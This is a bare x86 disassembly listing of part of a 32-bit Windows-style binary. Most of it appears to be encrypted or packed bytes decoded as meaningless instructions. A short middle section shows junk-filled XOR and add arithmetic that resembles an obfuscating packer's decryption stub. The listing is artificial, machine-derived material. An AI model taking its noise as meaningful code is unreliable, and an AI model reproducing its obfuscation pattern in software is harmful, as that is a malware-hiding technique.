  4081c9:	out    dx,al
  4081ca:	loope  0x40817e
  4081cc:	out    dx,eax
  4081cd:	mov    ebx,0xd1f8f7c6
  4081d2:	int3   
  4081d3:	iret   
  4081d4:	rcr    ebp,1
  4081d6:	loopne 0x4081c8
  4081d8:	(bad)  
  4081da:	jmp    esp
  4081dc:	shl    ebp,1
  4081de:	out    dx,eax
  4081df:	loopne 0x4081e5
  4081e1:	iret   
  4081e2:	sti    
  4081e3:	jmp    0xf83465b2
  4081e8:	(bad)
  4081eb:	aad    0xc9
  4081ed:	rcr    cl,cl
  4081ef:	aam    0xcb
  4081f1:	mov    ecx,0xf7b8e1cc
  4081f6:	sar    ecx,0xf4
  4081f9:	jmp    0x4081ec
  4081fb:	shl    bl,cl
  4081fd:	rcl    bh,1
  4081ff:	dec    esi
  408201:	bswap  ebx
  408203:	fdivr  QWORD PTR [ecx+esi*4-0x2d3c0a0a]
  40820a:	loope  0x4081fc
  40820c:	les    esi,FWORD PTR [ebp-0x2f0a2d0d]
  408212:	xlat   BYTE PTR ds:[ebx]
  408213:	xlat   BYTE PTR ds:[ebx]
  408214:	shl    edx,1
  408216:	iret   
  408217:	mov    esp,0xde06ccfd
  40821c:	(bad)  
  40821d:	add    bh,dh
  40821f:	add    eax,0xedcdded
  408224:	mov    edi,0xf3c7cfcc
  408229:	ror    edi,0xe2
  40822c:	repnz mov eax,0xb5b4f0e7
  408232:	mov    cl,0xd2
  408234:	repnz aad 0xc0
  408237:	int    0xc3
  408239:	cmc    
  40823a:	(bad)  
  40823c:	fadd   st(5),st
  40823e:	out    dx,al
  40823f:	test   bh,0xdd
  408242:	out    dx,al
  408243:	pop    es
  408244:	fidivr WORD PTR [eax-0x29353f4e]
  40824a:	mov    bh,0xf7
  40824c:	fcmove st,st(2)
  40824e:	div    esi
  408250:	aad    0xfe
  408252:	(bad)  
  408253:	fcomi  st,st(5)
  408255:	int3   
  408256:	in     al,dx
  408257:	hlt    
  408258:	out    0xfe,eax
  40825a:	stc    
  40825b:	(bad)  [eax]
  40825d:	jecxz  0x408236
  40825f:	cld    
  408260:	aam    0xce
  408262:	add    dl,BYTE PTR [ecx]
  408264:	out    0xd2,eax
  408266:	jecxz  0x408229
  408268:	jecxz  0x40821a
  40826a:	cli    
  40826b:	in     eax,dx
  40826c:	cli    
  40826d:	out    dx,al
  40826e:	into   
  40826f:	mov    ch,0xfa
  408271:	clc    
  408272:	shl    DWORD PTR [eax-0x6ff430b],cl
  408278:	fsubrp st(4),st
  40827a:	rcl    ch,1
  40827c:	(bad)  
  40827e:	push   cs
  40827f:	fcmovb st,st(6)
  408281:	pop    es
  408282:	push   es
  408283:	les    edi,FWORD PTR [edi-0xc283a1e]
  408289:	lods   al,BYTE PTR ds:[esi]
  40828a:	jmp    0xf43c5760
  40828f:	cmc    
  408290:	mov    ah,0xf3
  408292:	icebp  
  408293:	not    ebp
  408295:	lock shl bl,1
  408298:	rol    edi,0xf7
  40829b:	(bad)  [edx]
  40829d:	fcomp  st(5)
  40829f:	iret   
  4082a0:	jecxz  0x40826b
  4082a2:	add    al,0xee
  4082a4:	test   al,0xf2
  4082a6:	mov    cl,0xee
  4082a8:	out    0xed,al
  4082aa:	test   al,0xe5
  4082ad:	(bad)  
  4082ae:	hlt    
  4082af:	bnd jmp 0x4082ad
  4082b2:	aad    0xf5
  4082b4:	out    dx,al
  4082b5:	out    dx,eax
  4082b6:	add    edi,eax
  4082b8:	ror    BYTE PTR [ebx],0x7
  4082bb:	add    eax,esp
  4082bd:	add    eax,0xe9cf03e0
  4082c2:	std    
  4082c3:	out    dx,al
  4082c4:	stos   BYTE PTR es:[edi],al
  4082c5:	enter  0xe9c9,0xaf
  4082c9:	mov    ch,0xda
  4082cb:	out    0xe1,al
  4082cd:	mov    ah,0xcc
  4082cf:	std    
  4082d0:	div    bl
  4082d2:	mov    cl,0xdb
  4082d4:	div    edx
  4082d6:	std    
  4082d7:	(bad)  
  4082d8:	fcmovbe st,st(3)
  4082da:	add    eax,ebx
  4082dc:	mov    edi,0xe05e109
  4082e1:	(bad)  
  4082e2:	stc    
  4082e3:	repnz fldlg2 
  4082e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4082e7:	mov    esi,0xf6accac9
  4082ec:	mov    edx,0xb3d5e9d6
  4082f1:	(bad)  
  4082f2:	sti    
  4082f3:	(bad)  
  4082f4:	loopne 0x4082e5
  4082f6:	int    0xf9
  4082f8:	mov    esi,0x6ffeac4
  4082fd:	fsubr  st(3),st
  4082ff:	add    DWORD PTR [eax],eax
  408301:	add    ah,cl
  408303:	repz (bad) 
  408305:	call   0xca3076e8
  40830a:	lods   eax,DWORD PTR ds:[esi]
  40830b:	retf   0xc5d1
  40830e:	sti    
  40830f:	mov    esi,0xd6d0dac8
  408314:	add    ebx,eax
  408316:	(bad)  
  408318:	add    edi,edi
  40831a:	in     eax,0xd1
  40831c:	cli    
  40831d:	xlat   BYTE PTR ds:[ebx]
  40831e:	cld    
  40831f:	(bad)  
  408320:	out    0xd,eax
  408322:	add    ebp,edx
  408324:	fsub   DWORD PTR [esi-0x3a364f40]
  40832a:	shl    BYTE PTR [ebp-0x26371549],0xf5
  408331:	clc    
  408332:	inc    dl
  408334:	mov    ecx,0xf9b4f4ba
  408339:	add    bh,al
  40833b:	fstp   st(6)
  40833d:	(bad)  
  40833e:	(bad)  
  40833f:	loopne 0x40832b
  408341:	hlt    
  408342:	fadd   DWORD PTR [eax]
  408344:	sar    DWORD PTR [eax-0x232e2e0e],cl
  40834a:	out    0xe7,eax
  40834c:	fidiv  DWORD PTR [edi+ebp*8-0x310d2907]
  408353:	loope  0x40834d
  408355:	fsub   st,st(6)
  408357:	in     eax,0xf5
  408359:	add    al,0xd2
  40835b:	test   edi,0xc3d6cac9
  408361:	or     ah,ch
  408363:	fnstsw WORD PTR [esi+eax*8-0x1e1b1c4d]
  40836a:	out    dx,al
  40836b:	mov    ebx,0xb8b6daf8
  408370:	push   ebp
  408372:	mov    eax,0xbec8cee2
  408377:	(bad)  
  408378:	sar    DWORD PTR [ebp-0x903f83a],cl
  40837e:	cld    
  40837f:	retf   
  408380:	in     eax,dx
  408381:	fdivr  st,st(1)
  408383:	fadd   st(5),st
  408385:	out    dx,eax
  408386:	leave  
  408387:	test   al,0xd0
  408389:	in     al,dx
  40838a:	out    dx,eax
  40838b:	(bad)  
  40838c:	into   
  40838d:	mov    eax,0xdad2badf
  408392:	int    0xce
  408394:	lock repnz (bad) 
  408398:	ret    0xf3d8
  40839b:	fld    DWORD PTR [edx]
  40839d:	(bad)  
  40839e:	jmp    0x408379
  4083a0:	jecxz  0x4083a9
  4083a2:	fmul   DWORD PTR [edx]
  4083a4:	int3   
  4083a5:	loop   0x408383
  4083a7:	aad    0xf0
  4083a9:	int    0xc5
  4083ab:	(bad)  
  4083ac:	retf   0xf9c8
  4083af:	mov    ebx,0xcaf9fabd
  4083b4:	clc    
  4083b5:	(bad)  
  4083b7:	not    ah
  4083b9:	ret    
  4083ba:	mov    ecx,0xc6c4fef0
  4083bf:	retf   
  4083c0:	aam    0x13
  4083c2:	enter  0xd003,0xcb
  4083c6:	(bad)  
  4083c7:	enter  0xc3ce,0xc7
  4083cb:	lock rcr bl,cl
  4083ce:	jmp    0x40837c
  4083d0:	fdivr  st(1),st
  4083d2:	retf   0xf1f5
  4083d5:	fmulp  st(7),st
  4083d7:	(bad)  
  4083d8:	cli    
  4083d9:	shr    dl,cl
  4083db:	(bad)  
  4083dc:	cld    
  4083dd:	jmp    0xec0d:0xe209e1bd
  4083e4:	in     al,dx
  4083e5:	leave  
  4083e6:	in     eax,0xd5
  4083e8:	ret    0xb6f3
  4083eb:	out    0xd2,al
  4083ed:	shr    ah,1
  4083ef:	lods   al,BYTE PTR ds:[esi]
  4083f0:	mov    edi,0xeecefef8
  4083f5:	rcr    dh,0x0
  4083f8:	(bad)  
  4083f9:	(bad)  
  4083fb:	(bad)  
  4083fc:	in     eax,0xe4
  4083fe:	(bad)  
  4083ff:	in     al,0x1
  408401:	lds    eax,FWORD PTR [ebx]
  408403:	add    ecx,eax
  408405:	jmp    0xb11072ee
  40840a:	aad    0xe4
  40840c:	aam    0xba
  40840e:	mov    bh,0xdb
  408410:	mov    eax,0xf3eaffc4
  408415:	add    ebx,esp
  408417:	fstp   TBYTE PTR [esi-0x18f62107]
  40841d:	retf   0xc8fa
  408420:	retf   0x1ea
  408423:	iret   
  408424:	mov    ecx,0xf0f1f6c6
  408429:	out    0xd1,al
  40842b:	mov    bh,0xcf
  40842d:	scas   al,BYTE PTR es:[edi]
  40842e:	vpmulhw ymm2,ymm0,ymm7
  408432:	jecxz  0x408400
  408434:	out    dx,al
  408435:	int    0xf9
  408437:	mov    edi,0xe2f2d8c6
  40843c:	clc    
  40843d:	or     al,BYTE PTR ds:0xcee080f
  408443:	or     eax,0xf6c4cdc8
  408448:	loop   0x408420
  40844a:	vpsubsb xmm1,xmm7,xmm4
  40844e:	aad    0xb9
  408450:	repz fidivr DWORD PTR [eax-0x120d1f0a]
  408457:	rol    DWORD PTR [eax],0xc6
  40845a:	fcmovnu st,st(6)
  40845c:	fadd   st,st(4)
  40845e:	jmp    0xe1214a64
  408463:	clc    
  408464:	fisubr WORD PTR [esi-0x554f1b4d]
  40846a:	rcr    ebx,0xed
  40846d:	out    dx,al
  40846e:	(bad)  
  40846f:	shl    edi,1
  408471:	iret   
  408472:	mov    esi,0xfbe8fbbc
  408477:	(bad)  
  408479:	xlat   BYTE PTR ds:[ebx]
  40847a:	mul    ecx
  40847c:	fsubr  st,st(3)
  40847e:	(bad)
  408481:	(bad)  
  408483:	or     ah,ch
  408485:	lds    edi,FWORD PTR [ebp+ebx*8-0x2c043f37]
  40848c:	int    0xb9
  40848e:	in     al,0xeb
  408490:	retf   
  408491:	test   ch,0xce
  408494:	add    edi,edx
  408496:	aad    0xf5
  408498:	mov    esi,0xc409fadc
  40849d:	hlt    
  40849e:	add    al,dh
  4084a0:	(bad)  
  4084a1:	int3   
  4084a2:	(bad)  
  4084a4:	int3   
  4084a5:	leave  
  4084a6:	lds    edi,FWORD PTR [eax+ebp*8-0x144e1c1b]
  4084ad:	jmp    0x408493
  4084af:	std    
  4084b0:	out    dx,eax
  4084b1:	std    
  4084b2:	rcl    al,1
  4084b4:	loop   0x4084b5
  4084b6:	inc    dl
  4084b8:	repz in al,0xf1
  4084bb:	in     al,0x1
  4084bd:	sti    
  4084be:	jecxz  0x4084bc
  4084c0:	out    dx,al
  4084c1:	dec    eax
  4084c3:	fcmovb st,st(0)
  4084c5:	into   
  4084c6:	call   0xd7126989
  4084cb:	int    0xb2
  4084cd:	(bad)  
  4084ce:	imul   ecx
  4084d0:	mov    dh,0xed
  4084d2:	mov    cl,0xd1
  4084d4:	ret    0xbeda
  4084d7:	sar    al,1
  4084d9:	mov    esi,0x9c3ebeb
  4084de:	aam    0xef
  4084e0:	cld    
  4084e1:	fmul   DWORD PTR [edx]
  4084e3:	cli    
  4084e4:	loope  0x4084b1
  4084e6:	mov    bl,0xc4
  4084e8:	retf   0xb4e0
  4084eb:	out    dx,al
  4084ec:	mov    dl,0xd5
  4084ee:	in     al,dx
  4084ef:	out    dx,eax
  4084f0:	rcr    esi,cl
  4084f2:	mov    ch,0xc3
  4084f4:	in     al,dx
  4084f5:	cmc    
  4084f6:	fild   DWORD PTR [edi]
  4084f8:	add    esi,edi
  4084fa:	cmc    
  4084fb:	loope  0x4084e8
  4084fd:	fxch   st(2)
  4084ff:	clc    
  408500:	mov    BYTE PTR [edi],0x8
  408503:	push   es
  408504:	enter  0xe9c3,0xb1
  408508:	shr    DWORD PTR [ebp-0x27192f4e],0xee
  40850f:	fidivr DWORD PTR [eax-0x2d3607fd]
  408515:	(bad)  
  408516:	cli    
  408517:	mov    eax,0xc4d0fec2
  40851c:	clc    
  40851d:	mov    esi,0xe6f8f5c1
  408522:	leave  
  408523:	add    BYTE PTR [ecx-0x2e0a1f56],bh
  408529:	out    dx,eax
  40852a:	jmp    0xe5c8:0xe9e6e7d2
  408531:	cmc    
  408532:	fsub   st,st(2)
  408534:	mov    bh,0x1
  408536:	ret    
  408537:	aad    0xf1
  408539:	loopne 0x40850f
  40853b:	stc    
  40853c:	(bad)
  40853f:	jmp    0xe2a7d4b
  408544:	retf   
  408545:	mov    eax,0xc5f0c0ac
  40854b:	in     eax,dx
  40854c:	mov    ecx,0xf5f8e4e0
  408551:	(bad)  
  408553:	aam    0xd8
  408555:	fstp   TBYTE PTR [eax-0x3d021d1f]
  40855b:	loopne 0x408521
  40855d:	add    eax,esi
  40855f:	dec    DWORD PTR [edx+edi*8]
  408562:	add    DWORD PTR [ecx],ecx
  408564:	enter  0xcbad,0xe8
  408568:	jmp    0xf7075b4e
  40856d:	clc    
  40856e:	jmp    0xba37653d
  408573:	mov    ebp,0xdae6e803
  408578:	cld    
  408579:	mov    esp,0xe4d6c502
  40857e:	jecxz  0x408545
  408580:	add    ebx,ebp
  408582:	or     al,0xe7
  408584:	stos   DWORD PTR es:[edi],eax
  408585:	mov    dl,0xdc
  408587:	in     al,dx
  408588:	scas   eax,DWORD PTR es:[edi]
  408589:	enter  0xb7ec,0xcf
  40858d:	test   edi,0xb5d0dbcd
  408593:	mov    eax,0xd903bfd0
  408598:	add    al,0xff
  40859a:	fild   DWORD PTR ds:0xe0fde0f0
  4085a0:	fadd   st(4),st
  4085a2:	les    ecx,FWORD PTR [edi]
  4085a4:	out    0xcd,eax
  4085a6:	mov    bl,0xd2
  4085a8:	lods   al,BYTE PTR ds:[esi]
  4085a9:	loop   0x40857f
  4085ab:	ret    0xecc5
  4085ae:	int    0xcc
  4085b0:	retf   
  4085b1:	(bad)  
  4085b3:	add    edx,edx
  4085b5:	ret    
  4085b6:	add    esp,ebp
  4085b8:	int3   
  4085b9:	stc    
  4085ba:	repz cmc 
  4085bc:	cli    
  4085bd:	xlat   BYTE PTR ds:[ebx]
  4085be:	call   0xf84e54ac
  4085c3:	fdiv   DWORD PTR [edx-0x16534f41]
  4085c9:	stos   BYTE PTR es:[edi],al
  4085ca:	shl    esp,0xd9
  4085cd:	clc    
  4085ce:	sti    
  4085cf:	mov    esi,0xd6eff1f4
  4085d4:	mov    ebx,0xd9bce3
  4085d9:	aad    0xd2
  4085db:	stc    
  4085dc:	out    0xbe,al
  4085de:	fsub   st,st(4)
  4085e0:	clc    
  4085e1:	or     al,0xca
  4085e3:	shr    BYTE PTR [ebx-0x12285731],cl
  4085e9:	jmp    0x4085de
  4085eb:	in     eax,0xfa
  4085ed:	rcr    edi,cl
  4085ef:	repnz dec esi
  4085f2:	jmp    0x4085cf
  4085f4:	lock aad 0xd3
  4085f7:	(bad)  
  4085f9:	mov    esp,0xe7e4fccb
  4085fe:	stc    
  4085ff:	dec    ebx
  408601:	pmaxsw mm2,QWORD PTR [ecx]
  408604:	fcom   st(1)
  408606:	test   al,0xd7
  408608:	repz jmp 0xdbd9:0xb5b2d1b0
  408610:	lock ror ah,1
  408613:	fnstcw WORD PTR [ebp+0x6d9ddf4]
  408619:	fld    QWORD PTR ds:0xbd0f00f7
  40861f:	cmc    
  408620:	add    al,0x8
  408622:	call   0xd333392b
  408627:	mov    esp,0xc5d6b1ec
  40862c:	out    0xca,al
  40862e:	call   ebx
  408630:	retf   
  408631:	mov    esp,0xedf4e2fd
  408636:	mov    esp,0xe0f1fbd8
  40863b:	or     esi,esp
  40863d:	or     ecx,ebp
  40863f:	loope  0x408645
  408641:	cli    
  408642:	or     al,0xcd
  408644:	retf   
  408645:	fst    st(2)
  408647:	into   
  408648:	mov    bl,0xc6
  40864a:	in     al,0xc7
  40864c:	int    0xcc
  40864e:	aam    0xdf
  408650:	in     eax,dx
  408651:	xlat   BYTE PTR ds:[ebx]
  408652:	fistp  QWORD PTR [ebp-0x3d23090e]
  408658:	lock sti 
  40865a:	add    edx,esp
  40865c:	add    BYTE PTR [edi],al
  40865e:	push   es
  40865f:	stc    
  408660:	psubd  mm7,mm5
  408663:	push   DWORD PTR [edx-0x503a5713]
  408669:	out    0xe3,al
  40866b:	lds    edi,FWORD PTR [ebx-0x4a244950]
  408671:	bnd call 0xd3036744
  408677:	rcl    edi,cl
  408679:	rol    DWORD PTR [ecx],cl
  40867b:	jmp    0x1ed:0xd6ebe9bf
  408682:	add    edi,ebx
  408684:	sar    BYTE PTR [eax-0x4c1d4335],1
  40868a:	imul   esi
  40868c:	cli    
  40868d:	retf   
  40868e:	sti    
  40868f:	sti    
  408690:	(bad)  
  408691:	into   
  408692:	retf   0xcded
  408695:	inc    DWORD PTR [esi]
  408697:	int    0x2
  408699:	add    dh,cl
  40869b:	sti    
  40869c:	stc    
  40869d:	clc    
  40869e:	hlt    
  40869f:	in     al,0xca
  4086a1:	fcomp  st(1)
  4086a3:	retf   0xefe0
  4086a6:	mov    edi,0xe3c7e7f3
  4086ab:	loope  0x408667
  4086ad:	mov    dl,0xe4
  4086af:	rcl    dh,cl
  4086b1:	leave  
  4086b2:	int    0xdd
  4086b4:	ret    0xd4e7
  4086b7:	ret    0xdac1
  4086ba:	loop   0x408690
  4086bc:	jmp    0xc9f3:0xe7eef5de
  4086c3:	bswap  edi
  4086c5:	fdiv   QWORD PTR [edx-0x1d10521f]
  4086cb:	rol    bh,1
  4086cd:	(bad)  
  4086cf:	in     al,0xd6
  4086d1:	fstp   st(4)
  4086d3:	sti    
  4086d4:	in     al,dx
  4086d5:	iret   
  4086d6:	mov    ebp,0xfcf9e6de
  4086db:	repnz loope 0x4086c4
  4086de:	aad    0xf9
  4086e0:	jmp    edi
  4086e2:	adc    dh,cl
  4086e4:	in     eax,dx
  4086e5:	into   
  4086e6:	lods   eax,DWORD PTR ds:[esi]
  4086e7:	(bad)  
  4086e8:	loopne 0x4086cc
  4086ea:	leave  
  4086eb:	in     eax,dx
  4086ec:	mov    ebx,0xece9b9b7
  4086f1:	(bad)  
  4086f2:	aad    0xbc
  4086f4:	mov    esi,0xdff3d001
  4086f9:	stc    
  4086fa:	cli    
  4086fb:	or     al,BYTE PTR [esi+eax*1]
  4086fe:	ffree  st(5)
  408700:	loopne 0x408710
  408702:	or     eax,0xadeccd09
  408707:	mov    dl,0xe6
  408709:	retf   0xf2e6
  40870c:	in     eax,0xe6
  40870e:	mov    dh,0xe9
  408710:	mov    eax,0xfcbee2ee
  408715:	add    esi,esp
  408717:	std    
  408718:	(bad)
  40871b:	aad    0x8
  40871d:	xlat   BYTE PTR ds:[ebx]
  40871e:	fadd   st,st(4)
  408720:	jmp    0xdfe7:0xbdf8f3e9
  408727:	mov    esp,0xe0f3d2d5
  40872c:	out    0xae,eax
  40872e:	mov    cl,0xdd
  408730:	stc    
  408731:	jmp    0xc6e3:0xf003ffbb
  408738:	fadd   DWORD PTR [eax]
  40873a:	shr    cl,0xc3
  40873d:	shr    edi,0xce
  408740:	jmp    0xce218041
  408745:	mov    esp,0xf5c8c9cf
  40874a:	lods   al,BYTE PTR ds:[esi]
  40874b:	out    dx,al
  40874c:	fldpi  
  40874e:	imul   ebp
  408750:	cld    
  408751:	out    dx,al
  408752:	enter  0xbdde,0xbd
  408756:	add    edx,esp
  408758:	xlat   BYTE PTR ds:[ebx]
  408759:	icebp  
  40875a:	hlt    
  40875b:	fcmovnb st,st(3)
  40875d:	sar    ah,1
  40875f:	(bad)
  408762:	int    0xe4
  408764:	ret    
  408765:	out    dx,al
  408766:	jmp    0x408719
  408768:	scas   eax,DWORD PTR es:[edi]
  408769:	(bad)  
  40876a:	test   eax,0xc4b0e9ef
  40876f:	fcmovnbe st,st(2)
  408771:	cli    
  408772:	mov    esp,0x1c3dfce
  408777:	shr    ch,0x7
  40877a:	aad    0xe3
  40877c:	out    0xdf,al
  40877e:	jmp    ebx
  408780:	out    dx,al
  408781:	int    0xd8
  408783:	or     ah,bh
  408785:	fadd   st(4),st
  408787:	shl    edi,cl
  408789:	mov    dh,0xc5
  40878b:	xlat   BYTE PTR ds:[ebx]
  40878c:	shr    dl,0xeb
  40878f:	call   0xca436684
  408794:	mov    eax,0x2d6d1e7
  408799:	rcr    dl,cl
  40879b:	jecxz  0x4087a1
  40879d:	push   es
  40879e:	push   cs
  40879f:	out    0xf8,al
  4087a1:	hlt    
  4087a2:	in     al,0xe6
  4087a4:	out    0xd3,eax
  4087a6:	shr    bl,cl
  4087a8:	scas   al,BYTE PTR es:[edi]
  4087a9:	mov    ch,0xd2
  4087ab:	out    0xd1,al
  4087ad:	xabort 0xf5
  4087b0:	mov    ebp,0xe3fdffba
  4087b5:	ret    
  4087b6:	into   
  4087b7:	(bad)  
  4087b8:	add    ebx,esp
  4087ba:	add    BYTE PTR [edx],al
  4087bc:	fst    st(0)
  4087be:	fstp   st(4)
  4087c0:	leave  
  4087c1:	(bad)  
  4087c3:	out    dx,eax
  4087c4:	in     al,0xcf
  4087c6:	test   eax,0xbbccf5dc
  4087cb:	enter  0xffc0,0xf7
  4087cf:	mov    eax,0xc2fdbeba
  4087d4:	out    dx,eax
  4087d5:	sti    
  4087d6:	mov    esi,0xf907ffdd
  4087db:	in     al,0xfb
  4087dd:	fcmove st,st(7)
  4087df:	aad    0xcb
  4087e1:	stc    
  4087e2:	(bad)  
  4087e3:	fchs   
  4087e5:	jmp    0xc30636da
  4087ea:	lods   al,BYTE PTR ds:[esi]
  4087eb:	cmc    
  4087ec:	mov    ch,0xd5
  4087ee:	mov    edi,0xd5c8ebf0
  4087f3:	loop   0x4087e7
  4087f5:	iret   
  4087f6:	pop    es
  4087f7:	loopne 0x4087b5
  4087f9:	lock repz shr bl,cl
  4087fd:	faddp  st(4),st
  4087ff:	hlt    
  408800:	leave  
  408801:	out    dx,eax
  408802:	in     al,dx
  408803:	leave  
  408804:	test   al,0xef
  408806:	loop   0x4087d3
  408808:	mov    dh,0xca
  40880a:	les    esi,FWORD PTR [ebx-0x28115139]
  408810:	fnstsw WORD PTR [edx-0x2c2a254f]
  408816:	rol    DWORD PTR [ebx+0xd8100d9],0x73
  40881d:	ja     0x408862
  40881f:	add    BYTE PTR [edi+0x77],ch
  408822:	inc    ebx
  408823:	add    BYTE PTR ds:0x8a29a14b,dh
  408829:	xor    ecx,0x0
  40882c:	adc    DWORD PTR ds:0x43770f,0x45ac
  408836:	xor    eax,0x8a29a14b
  40883b:	or     DWORD PTR ds:0x437743,0x680c
  408845:	xor    ecx,0x0
  408848:	adc    DWORD PTR ds:0x437737,0x53d4
  408852:	add    eax,0x5424137
  408857:	adc    ecx,0x0
  40885a:	sbb    ecx,DWORD PTR ds:0x437723
  408860:	mov    ecx,DWORD PTR [ebp-0x4]
  408863:	and    DWORD PTR ds:0x4377b3,0x437713
  40886d:	mov    ecx,DWORD PTR [ecx]
  40886f:	sub    DWORD PTR ds:0x43777b,0x4c6e
  408879:	xor    ecx,eax
  40887b:	mov    eax,DWORD PTR [ebp-0x4]
  40887e:	mov    DWORD PTR [eax],ecx
  408880:	and    DWORD PTR ds:0x43776f,0x0
  40888a:	mov    ecx,DWORD PTR ds:0x43776f
  408890:	inc    ecx
  408891:	mov    DWORD PTR ds:0x43776f,ecx
  408897:	cmp    DWORD PTR ds:0x43776f,0x21
  40889e:	jge    0x4088c4
  4088a4:	jmp    0x4088b7
  4088a9:	push   0x43777f
  4088ae:	push   DWORD PTR [ebp-0xc]
  4088b1:	call   DWORD PTR ds:0x43c990
  4088b7:	cmp    DWORD PTR ds:0x43776f,0x1e
  4088be:	jb     0x40888a
  4088c4:	mov    eax,DWORD PTR [ebp+0x14]
  4088c7:	mov    eax,DWORD PTR [eax]
  4088c9:	sbb    ecx,DWORD PTR ds:0x4377b7
  4088cf:	mov    DWORD PTR [ebp-0x24],eax
  4088d2:	mov    DWORD PTR ds:0x43777f,0x1e
  4088dc:	cmp    DWORD PTR ds:0x43777f,0x0
  4088e3:	je     0x408942
  4088e9:	cmp    DWORD PTR ds:0x43777f,0xf
  4088f0:	jbe    0x408942
  4088f6:	jmp    0x408916
  4088fb:	push   DWORD PTR [ebp-0x20]
  4088fe:	push   0x79ea
  408903:	push   0x437038
  408908:	push   0x43707c
  40890d:	push   DWORD PTR [ebp-0x24]
  408910:	call   DWORD PTR ds:0x43c994
  408916:	cmp    DWORD PTR ds:0x43777f,0x10
  40891d:	jne    0x408930
  408923:	mov    ecx,DWORD PTR ds:0x43777f
  408929:	dec    ecx
  40892a:	mov    DWORD PTR ds:0x43777f,ecx
  408930:	mov    ecx,DWORD PTR ds:0x43777f
  408936:	dec    ecx
  408937:	mov    DWORD PTR ds:0x43777f,ecx
  40893d:	jmp    0x4088dc
  408942:	mov    eax,DWORD PTR [ebp-0x24]
  408945:	mov    eax,DWORD PTR [eax]
  408947:	sbb    DWORD PTR ds:0x437717,ebx
  40894d:	mov    ecx,DWORD PTR [ebp-0x4]
  408950:	mov    ecx,DWORD PTR [ecx]
  408952:	or     DWORD PTR ds:0x437733,0x5314
  40895c:	xor    edx,edx
  40895e:	sub    ecx,0x5424137
  408964:	mov    DWORD PTR ds:0x43778b,0x2c2f
  40896e:	sbb    edx,0x0
  408971:	xor    ecx,0x8a29a14b
  408977:	xor    DWORD PTR ds:0x4377b3,0x4c4d
  408981:	xor    edx,0x0
  408984:	add    DWORD PTR ds:0x437787,0x4377b3
  40898e:	xor    ecx,0x8a29a14b
  408994:	and    DWORD PTR ds:0x437717,0x380f
  40899e:	xor    edx,0x0
  4089a1:	add    ecx,0x5424137
  4089a7:	mov    DWORD PTR ds:0x437713,0x5282
  4089b1:	adc    edx,0x0
  4089b4:	mov    eax,DWORD PTR [eax]
  4089b6:	add    DWORD PTR ds:0x43775f,0x43771b
  4089c0:	xor    esi,esi
  4089c2:	sbb    DWORD PTR ds:0x437783,0x7cb2
  4089cc:	add    eax,ecx
  4089ce:	adc    esi,edx
  4089d0:	mov    DWORD PTR ds:0x43773f,edi
  4089d6:	mov    ecx,DWORD PTR [ebp-0x24]
  4089d9:	mov    ecx,DWORD PTR [ecx]
  4089db:	mov    DWORD PTR ds:0x43775b,0x153c
  4089e5:	mov    DWORD PTR [ecx],eax
  4089e7:	mov    eax,DWORD PTR [ebp-0xc]
  4089ea:	mov    DWORD PTR [eax],0x70941f81
  4089f0:	mov    DWORD PTR [eax+0x4],0xffffffff
  4089f7:	jmp    0x40d295
  4089fc:	mov    eax,ds:0x43775b
  408a01:	xor    eax,DWORD PTR ds:0x4377a3
  408a07:	mov    ds:0x43775b,eax
  408a0c:	jmp    0x40ad5a
  408a11:	jl     0x4089e1
  408a13:	push   0x542468a2
  408a18:	hlt    
  408a19:	pop    ds
  408a1a:	nop
  408a1b:	leave  
  408a1c:	mov    bl,ch
  408a1e:	mov    bh,0x50
  408a20:	or     DWORD PTR [eax],ecx
  408a22:	loop   0x408a9f
  408a24:	jnp    0x4089d0
  408a26:	cwde   
  408a27:	jnp    0x408aa4
  408a29:	pop    es
  408a2a:	fchs   
  408a2c:	ret    0xd60b
  408a2f:	xlat   BYTE PTR ds:[ebx]
  408a30:	inc    DWORD PTR [ebx]
  408a32:	in     eax,0xe3
  408a34:	out    dx,eax
  408a35:	push   cs
  408a36:	out    0xe6,eax
  408a38:	scas   eax,DWORD PTR es:[edi]
  408a39:	iret   
  408a3a:	mov    ch,0xec
  408a3c:	aam    0xc0
  408a3e:	scas   eax,DWORD PTR es:[edi]
  408a3f:	aad    0xb9
  408a41:	(bad)
  408a44:	div    ebx
  408a46:	xlat   BYTE PTR ds:[ebx]
  408a47:	(bad)  
  408a49:	sar    bl,cl
  408a4b:	(bad)  
  408a4c:	rol    BYTE PTR [edx+ecx*1],1
  408a4f:	stc    
  408a50:	or     edx,esp
  408a52:	loope  0x408a4c
  408a54:	add    ebx,esp
  408a56:	mov    edi,0xd4c9aec3
  408a5b:	in     eax,0xe4
  408a5d:	in     al,dx
  408a5e:	sar    ecx,1
  408a60:	int    0xba
  408a62:	retf   0xfed6
  408a65:	(bad)  
  408a66:	in     al,dx
  408a67:	add    edi,edx
  408a69:	mov    esi,0xc204c1d1
  408a6e:	add    ch,bl
  408a70:	fadd   st,st(0)
  408a72:	in     al,dx
  408a73:	out    dx,al
  408a74:	loope  0x408a59
  408a76:	lods   al,BYTE PTR ds:[esi]
  408a77:	mov    esi,0xebadc8cd
  408a7c:	shl    BYTE PTR [edi-0x28060f4c],cl
  408a82:	hlt    
  408a83:	fdivr  QWORD PTR [ecx-0x432d0ffe]
  408a89:	add    eax,eax
  408a8b:	ret    0xd7e0
  408a8e:	in     eax,0xfe
  408a90:	in     eax,0xc4
  408a92:	aad    0xf8
  408a94:	call   0xcfe73485
  408a99:	leave  
  408a9a:	retf   
  408a9b:	in     al,0xe4
  408a9d:	repz fcmovne st,st(0)
  408aa0:	stc    
  408aa1:	call   esp
  408aa3:	cli    
  408aa4:	mov    ah,0xfc
  408aa6:	add    al,bl
  408aa8:	std    
  408aa9:	push   es
  408aaa:	mov    BYTE PTR [eax+ebx*8],0xea
  408aae:	fadd   st,st(7)
  408ab0:	add    edi,DWORD PTR [ebx+edi*8-0x1ffa043a]
  408ab7:	(bad)
  408aba:	shl    esp,cl
  408abc:	(bad)  
  408abd:	out    0xc5,al
  408abf:	imul   esi
  408ac1:	int3   
  408ac2:	mov    edx,0xfffbcec9
  408ac7:	fmul   st,st(5)
  408ac9:	cmc    
  408aca:	(bad)  
  408acb:	in     al,0xd9
  408acd:	mov    esp,0xc7d8dfe9
  408ad2:	les    ecx,FWORD PTR [edi]
  408ad4:	push   es
  408ad5:	in     al,dx
  408ad6:	ror    bl,1
  408ad8:	fcomip st,st(5)
  408ada:	out    dx,al
  408adb:	in     eax,0xc7
  408add:	loop   0x408ab6
  408adf:	clc    
  408ae0:	leave  
  408ae1:	retf   
